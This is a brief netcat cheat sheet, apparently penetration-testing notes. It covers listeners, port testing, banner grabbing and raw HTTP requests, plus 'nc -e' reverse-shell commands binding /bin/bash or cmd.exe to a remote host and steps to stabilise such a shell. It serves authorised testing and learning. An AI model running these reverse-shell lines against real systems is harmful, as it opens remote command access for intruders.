# Netcat - NC

## Listener

```bash
nc -nlvp <LPORT>
```

```bash
rlwrap -cAr nc -nlvp <LPORT>
```

## Connect

```bash
nc <RHOST> <RPORT>
```

Use `-e` to link the connection to a program.

```bash
nc -e /bin/bash <RHOST> <RPORT>
```

```bash
nc -e cmd.exe <RHOST> <RPORT>
```

## investigate ports

- test port

```bash
nc -zv <RHOST> <RPORT>
```

- get banner

```bash
echo "QUIT" | nc <RHOST> <RPORT>
```

- send http request

```bash
printf "GET / HTTP/1.0\r\n\r\n" | nc <RHOST> <RPORT>
```

## Stabilize Reverse Shell

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
Ctrl z
stty raw -echo; fg
```

## Links

[Stabilize a reverse shell](https://tkcyber.com/index.php/2022/06/19/stabilize-a-reverse-shell/)
